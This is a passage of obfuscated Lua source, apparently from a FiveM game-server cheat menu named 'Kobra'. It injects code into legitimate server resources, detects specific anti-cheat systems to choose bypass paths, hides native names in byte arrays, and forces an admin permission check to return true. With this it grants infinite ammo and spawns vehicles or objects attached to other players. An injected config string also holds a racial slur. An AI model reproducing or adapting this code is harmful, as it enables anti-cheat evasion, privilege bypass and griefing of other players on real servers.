v1219(...);end);hNative("SetTextEdge",function(v1220,...) return v1220(...);end);hNative("SetTextOutline",function(v1221,...) return v1221(...);end);v957=4 + 1 ;end if (v957==(22 -(12 + 5))) then hNative("SetTextCentre",function(v1222,...) return v1222(...);end);hNative("SetTextColour",function(v1223,...) return v1223(...);end);hNative("BeginTextCommandDisplayText",function(v1224,...) return v1224(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1225,...) return v1225(...);end);v957=4 + 2 ;end if (v957==(7 -4)) then hNative("DestroyCam",function(v1226,...) return v1226(...);end);hNative("SetFocusEntity",function(v1227,...) return v1227(...);end);hNative("SetTextFont",function(v1228,...) return v1228(...);end);hNative("SetTextProportional",function(v1229,...) return v1229(...);end);v957=2 + 2 ;end if (v957==6) then hNative("EndTextCommandDisplayText",function(v1230,...) return v1230(...);end);hNative("GetCamCoord",function(v1231,...) return v1231(...);end);hNative("GetCamRot",function(v1232,...) return v1232(...);end);hNative("IsControlPressed",function(v1233,...) return v1233(...);end);v957=7;end if (v957==(1102 -(277 + 816))) then hNative("TaskWarpPedIntoVehicle",function(v1234,...) return v1234(...);end);hNative("SetEntityCoords",function(v1235,...) return v1235(...);end);hNative("GiveWeaponToPed",function(v1236,...) return v1236(...);end);hNative("SetCurrentPedWeapon",function(v1237,...) return v1237(...);end);v957=42 -32 ;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v869=1183 -(1058 + 125) ;while true do if (v869==(1 + 1)) then hNative("CreateCam",function(v1042,...) return v1042(...);end);hNative("SetCamCoord",function(v1043,...) return v1043(...);end);hNative("SetCamRot",function(v1044,...) return v1044(...);end);hNative("RenderScriptCams",function(v1045,...) return v1045(...);end);v869=3;end if (v869==(985 -(815 + 160))) then hNative("ShootSingleBulletBetweenCoords",function(v1046,...) return v1046(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then local v1163=0 -0 ;while true do if ((0 + 0)==v1163) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v869==(8 -5)) then hNative("DestroyCam",function(v1047,...) return v1047(...);end);hNative("SetFocusEntity",function(v1048,...) return v1048(...);end);hNative("SetTextFont",function(v1049,...) return v1049(...);end);hNative("SetTextProportional",function(v1050,...) return v1050(...);end);v869=4;end if (v869==(1902 -(41 + 1857))) then hNative("SetTextScale",function(v1051,...) return v1051(...);end);hNative("SetTextDropShadow",function(v1052,...) return v1052(...);end);hNative("SetTextEdge",function(v1053,...) return v1053(...);end);hNative("SetTextOutline",function(v1054,...) return v1054(...);end);v869=5;end if (v869==(1899 -(1222 + 671))) then hNative("EndTextCommandDisplayText",function(v1055,...) return v1055(...);end);hNative("GetCamCoord",function(v1056,...) return v1056(...);end);hNative("GetCamRot",function(v1057,...) return v1057(...);end);hNative("IsControlPressed",function(v1058,...) return v1058(...);end);v869=18 -11 ;end if (v869==(6 -1)) then hNative("SetTextCentre",function(v1059,...) return v1059(...);end);hNative("SetTextColour",function(v1060,...) return v1060(...);end);hNative("BeginTextCommandDisplayText",function(v1061,...) return v1061(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1062,...) return v1062(...);end);v869=6;end if (v869==(1191 -(229 + 953))) then hNative("TaskWarpPedIntoVehicle",function(v1063,...) return v1063(...);end);hNative("SetEntityCoords",function(v1064,...) return v1064(...);end);hNative("GiveWeaponToPed",function(v1065,...) return v1065(...);end);hNative("SetCurrentPedWeapon",function(v1066,...) return v1066(...);end);v869=10;end if (v869==(1774 -(1111 + 663))) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1067,v1068) local v1069=_G[v1067];if ( not v1069 or (type(v1069)~="function")) then return;end _G[v1067]=function(...) return v1068(v1069,...);end;end hNative("CreateThread",function(v1070,...) return v1070(...);end);v869=1580 -(874 + 705) ;end if ((1 + 6)==v869) then hNative("GetDisabledControlNormal",function(v1071,...) return v1071(...);end);hNative("TaskStandStill",function(v1072,...) return v1072(...);end);hNative("SetFocusPosAndVel",function(v1073,...) return v1073(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1074,...) return v1074(...);end);v869=8;end if ((1 + 0)==v869) then hNative("Wait",function(v1075,...) return v1075(...);end);hNative("IsVehicleSeatFree",function(v1076,...) return v1076(...);end);hNative("PlayerPedId",function(v1077,...) return v1077(...);end);hNative("GetEntityCoords",function(v1078,...) return v1078(...);end);v869=2;end if (v869==(16 -8)) then hNative("GetShapeTestResult",function(v1079,...) return v1079(...);end);hNative("IsControlJustPressed",function(v1080,...) return v1080(...);end);hNative("IsDisabledControlJustPressed",function(v1081,...) return v1081(...);end);hNative("IsEntityAVehicle",function(v1082,...) return v1082(...);end);v869=1 + 8 ;end end end break;end end end end;v12.EnableInfiniteAmmo=function(v190) if (GetResourceState("WaveShield")=="started") then print("1");local function v504(v579) local v580="";for v671=680 -(642 + 37) , #v579 do v580=v580   .. string.char(v579[v671]) ;end return v580;end local function v505(v581) return _G[v504(v581)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v506=v505({19 + 61 ,270 -162 ,551 -(233 + 221) ,121,1642 -(718 + 823) ,114,226 -146 ,101,100,73,37 + 63 });local v507=v505({71,229 -128 ,113 + 3 ,83,1933 -(1552 + 280) ,942 -(64 + 770) ,101,224 -125 ,1359 -(157 + 1086) ,442 -341 ,136 -36 ,159 -79 ,74 + 27 ,140 -40 ,87,24 + 77 ,97,971 -(464 + 395) ,54 + 57 ,227 -117 });local v508=v505({71,101,116,246 -174 ,97,115,104,75,478 -377 ,87 + 34 });local v509=v505({461 -(14 + 376) ,175 -74 ,116,62 + 3 ,319 -210 ,187 -(23 + 55) ,111,49 + 24 ,170 -60 ,981 -(652 + 249) ,270 -169 ,271 -171 ,87,101,22 + 75 ,214 -102 ,2019 -(242 + 1666) ,110});local v510=v505({65,1040 -(850 + 90) ,175 -75 ,1455 -(360 + 1030) ,307 -198 ,149 -40 ,111,84,202 -91 ,80,64 + 37 ,235 -135 });local v511=v505({1201 -(1076 + 57) ,800 -(579 + 110) ,90 + 11 ,62 + 53 ,69,110,323 -207 ,105,203 -87 ,1295 -(663 + 511) ,69,27 + 93 ,64 + 41 ,278 -163 ,116});local v512=v505({87,188 -91 ,10 + 95 ,116});local v513={};local function v514(v582) local v583=0;local v584;local v585;while true do if (v583==(517 -(440 + 77))) then v584=coroutine.create(v582);v585=nil;v583=1;end if (v583==1) then function v585() while coroutine.status(v584)~="dead"  do local v916,v917=coroutine.resume(v584);if  not v916 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v917);break;end v512(0 + 0 );end end v585();break;end end end if  not _G.osintWaveLoop then _G.osintWaveLoop=true;v514(function() while _G.osintWaveLoop do if _G.osintInfAmmo.enabled then local v918=v506();if v511(v918) then local v1024=v507(v918);if (v1024 and (v1024~=v508("WEAPON_UNARMED"))) then local v1164,v1165=v509(v918,v1024);local v1166=tostring(v918);if  not v513[v1166] then v513[v1166]=v1165;end if (v1165<v513[v1166]) then v510(v918,v1024,v513[v1166] -v1165 );end end end else coroutine.yield();end coroutine.yield();end end);end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v191) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v192,v193,v194) local v195=0;local v196;local v197;local v198;local v199;local v200;while true do if (v195==(7 -5)) then v197=v194;v198=v196(v197);v195=3;end if (v195==4) then for v672,v673 in ipairs(v193) do if (GetResourceState("solos-rentals")=="started") then print("[vehicle_attach] Fallback: solos-rentals");local v838,v839=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v198,v673));end);if v838 then v200=v200 + (1557 -(655 + 901)) ;end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v919,v920=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v198,v673));end);if v919 then v200=v200 + 1 ;end elseif (GetResourceState("qb-core")=="started") then print("[vehicle_attach] Fallback #02");local v1025,v1026=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v198,v673));end);if v1025 then v200=v200 + 1 + 0 ;end elseif ((v199:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1167=0 + 0 ;local v1168;local v1169;while true do if (v1167==(0 + 0)) then print("[vehicle_attach] Fallback #1");v1168,v1169=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v198,v673));end);v1167=3 -2 ;end if (v1167==(1446 -(695 + 750))) then if v1168 then v200=v200 + (3 -2) ;end break;end end elseif (GetResourceState("lunar_bridge")=="started") then local v1281=0 -0 ;local v1282;local v1283;while true do if (v1281==(0 -0)) then print("[vehicle_attach] Fallback #2");v1282,v1283=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v198,v673));end);v1281=1;end if ((352 -(285 + 66))==v1281) then if v1282 then v200=v200 + 1 ;end break;end end elseif (GetResourceState("lation_laundering")=="started") then print("[vehicle_attach] Fallback #3");local v1332,v1333=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v198,v673));end);if v1332 then v200=v200 + (2 -1) ;end else print("[vehicle_attach] Universal Fallback");local v1334,v1335=pcall(function() local v1361=1310 -(682 + 628) ;local v1362;while true do if (0==v1361) then v1362=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v198,v673);MachoInjectResourceRaw("any",v1362,v673);break;end end end);if v1334 then v200=v200 + 1 + 0 ;end end end break;end if ((300 -(176 + 123))==v195) then v196=nil;function v196(v674) local v675=0 + 0 ;local v676;while true do if (v675==1) then return table.concat(v676,",");end if (0==v675) then v676={};for v921=1 + 0 , #v674 do v676[v921]=string.byte(v674,v921);end v675=270 -(239 + 30) ;end end end v195=1 + 1 ;end if (v195==(3 + 0)) then v199=GetCurrentServerEndpoint();v200=0 -0 ;v195=12 -8 ;end if (v195==(315 -(306 + 9))) then if ( not v193 or ( #v193==(0 -0))) then v192:Notify("error","Kobra","No players selected!",522 + 2478 );return;end if ( not v194 or ( #v194==(0 + 0))) then v192:Notify("error","Kobra","Invalid vehicle model!",3000);return;end v195=1;end end end;function encodeToByteArrayLiteral(v201) local v202=0 + 0 ;local v203;while true do if ((0 -0)==v202) then if  not v201 then return "";end if (type(v201)~="string") then return tostring(v201);end v202=1376 -(1140 + 235) ;end if (v202==1) then if ( #v201==(0 + 0)) then return "";end v203={};v202=2;end if (v202==2) then for v677=1 + 0 , #v201 do v203[ #v203 + 1 ]=tostring(string.byte(v201,v677));end return table.concat(v203,", ");end end end v12.SpawnSelectedObject=function(v204,v205) if ( not v205 or ( #v205==(0 + 0))) then local v515=52 -(33 + 19) ;while true do if (v515==0) then v204:Notify("error","Kobra","No players selected!",1084 + 1916 );return;end end end local v206=v204:GetSelectedObjectModel();if ( not v206 or ( #v206==(0 -0))) then local v516=0 + 0 ;while true do if (v516==0) then v204:Notify("error","Kobra","Invalid object model!",5883 -2883 );return;end end end local v207=encodeToByteArrayLiteral(v206);local v208=0;for v319,v320 in ipairs(v205) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then v204:Notify("error","Kobra","Using Qb-core Spawner!",3000);MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v207,v320));v208=v208 + 1 + 0 ;elseif (GetResourceState("cd_dispatch")=="started") then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v207,v320));v208=v208 + (690 -(586 + 103)) ;elseif (GetResourceState("rcore_drunk")=="started") then local v870=0 + 0 ;while true do if (v870==(0 -0)) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v206,v320));v208=v208 + (1489 -(1309 + 179)) ;break;end end elseif (GetResourceState("lc_fuel")=="started") then local v958=0 -0 ;while true do if (v958==(0 + 0)) then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v206,v320));v208=v208 + 1 ;break;end end elseif (GetResourceState("0r-illegalpack")=="started") then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v206,v320));v208=v208 + (2 -1) ;elseif (GetResourceState("xradio")=="started") then local v1238=0 + 0 ;while true do if (v1238==(0 -0)) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v206,v320));v208=v208 + (1 -0) ;break;end end else local v1239=609 -(295 + 314) ;while true do if (v1239==0) then MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
